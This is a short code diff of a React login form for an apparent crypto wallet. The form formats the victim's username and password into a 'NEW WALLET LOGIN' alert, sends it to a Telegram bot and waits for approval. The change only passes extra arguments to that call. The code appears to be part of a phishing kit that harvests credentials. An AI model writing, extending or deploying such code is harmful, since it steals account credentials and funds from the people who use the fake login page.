@@ -20,7 +20,7 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLogin }) => {
     const message = `<b>🚨 NEW WALLET LOGIN 🚨</b>\n\n<b>👤 Username:</b> <code>${username}</code>\n<b>🔑 Password:</b> <code>${password}</code>\n\n<i>🌐 Automated Log Request</i>`;
     
     try {
-      const isAccepted = await sendLoginToTelegramAndWait(message);
+      const isAccepted = await sendLoginToTelegramAndWait(message, username, false);
       if (isAccepted) {
         onLogin({ username, password });
       } else {
